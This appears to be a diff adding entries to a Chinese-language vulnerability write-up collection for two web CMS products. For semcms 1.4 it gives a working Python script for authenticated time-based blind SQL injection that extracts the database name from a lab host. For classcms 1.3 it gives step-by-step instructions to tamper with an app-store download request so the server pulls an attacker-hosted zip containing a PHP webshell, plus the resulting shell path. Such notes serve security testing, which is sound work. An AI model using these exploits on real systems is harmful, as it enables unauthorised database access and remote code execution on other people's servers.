@@ -1148,3 +1148,94 @@ admin' #
 成功越权进入后台
 
 ![image-20221207170842017](images/image-20221207170842017.png)
+
+### semcms
+
+```
+版本信息：1.4
+```
+
+#### 后台sql注入
+
+登录进后台后进入到【信息管理】的【博客管理】，选中博客并且删除然后抓包
+
+![image-20221208155305246](images/image-20221208155305246.png)
+
+构造时间盲注，成功执行了sleep
+
+![image-20221208155423824](images/image-20221208155423824.png)
+
+获取数据库名长度
+
+![image-20221208155507763](images/image-20221208155507763.png)
+
+```
+import requests
+
+database = ""
+header = {
+    "X-Requested-With": "XMLHttpRequest",
+    "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
+    "Cookie": "theme=default; frontLang=zh-cn; __bid_n=184ada2f395ab4dd774207; ECS[visit_times]=2; ishistory=1; gnolt4_admin_username=admin; PHPSESSID=ksj15tsgisn8b7fhq40uvkif11",
+    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36 Edg/105.0.1343.42"
+}
+# proxier = {
+#     "http": "127.0.0.1:8080"
+# }
+
+for i in range(1, 7):
+    for a in range(47, 127):
+        payload = "http://192.168.81.116:12342/hXd0MR_AhF/Ant_Inc.php?action=Clear&sort=info&lgid=1"
+        data = "DID[]=15 and if(ascii(substr(database(),{},1))={},sleep(3),1)".format(i, a)
+        re = requests.post(url=payload, data=data, headers=header, timeout=10)
+        # print(re.elapsed.total_seconds())
+        if re.elapsed.total_seconds() > 6:
+            database += chr(a)
+            print(database)
+```
+
+![image-20221208160247571](images/image-20221208160247571.png)
+
+### classcms
+
+```
+版本信息：1.3
+```
+
+#### 远程文件下载getshell
+
+登录进后台，进入应用商店主页
+
+![image-20221214164619525](images/image-20221214164619525.png)
+
+选择应用下载
+
+![image-20221214164647789](images/image-20221214164647789.png)
+
+点击下载然后抓包
+
+![image-20221214164713622](images/image-20221214164713622.png)
+
+以下请求包放过
+
+![image-20221214164743757](images/image-20221214164743757.png)
+
+然后抓取到以下请求包
+
+![image-20221214164812024](images/image-20221214164812024.png)
+
+可以将classhash修改，随意修改，并将url修改为自己的地址，1.zip里含有一个1.php
+
+![image-20221214164911618](images/image-20221214164911618.png)
+
+将包发送过去后在浏览器看到格式错误，不用理会，实际上文件已经下载到服务器了
+
+![image-20221214165023205](images/image-20221214165023205.png)
+
+webshell路径为
+
+```
+/class/[classhash值]/压缩包内php文件
+```
+
+![image-20221214165145891](images/image-20221214165145891.png)
